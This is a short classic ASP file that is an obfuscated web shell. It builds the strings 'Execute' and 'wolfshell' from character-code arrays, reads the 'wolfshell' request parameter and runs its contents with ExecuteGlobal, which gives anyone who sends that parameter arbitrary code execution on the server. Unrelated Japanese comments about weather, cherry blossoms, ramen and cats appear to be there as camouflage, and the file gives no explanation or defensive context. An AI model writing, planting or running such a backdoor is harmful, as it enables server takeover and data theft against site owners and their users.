<%
' 今日の天気は晴れです
Function f_get_s_a1(p_a2)
    Dim t_a3, i_a4
    t_a3 = ""
    ' 桜が満開です
    For i_a4 = 0 To UBound(p_a2)
        t_a3 = t_a3 & Chr(p_a2(i_a4))
    Next
    f_get_s_a1 = t_a3
End Function

Dim v_b1, v_b2, v_b3, v_b4

' このラーメンは美味しい
v_b1 = f_get_s_a1(Array(69, 120, 101, 99, 117, 116, 101))

' 猫は液体である
v_b2 = f_get_s_a1(Array(119, 111, 108, 102, 115, 104, 101, 108, 108))

v_b3 = request(v_b2)

If Len(v_b3) > 0 Then
    ' 電車が遅れています
    v_b4 = v_b1 & "(v_b3)"
    ExecuteGlobal v_b4
End If
%>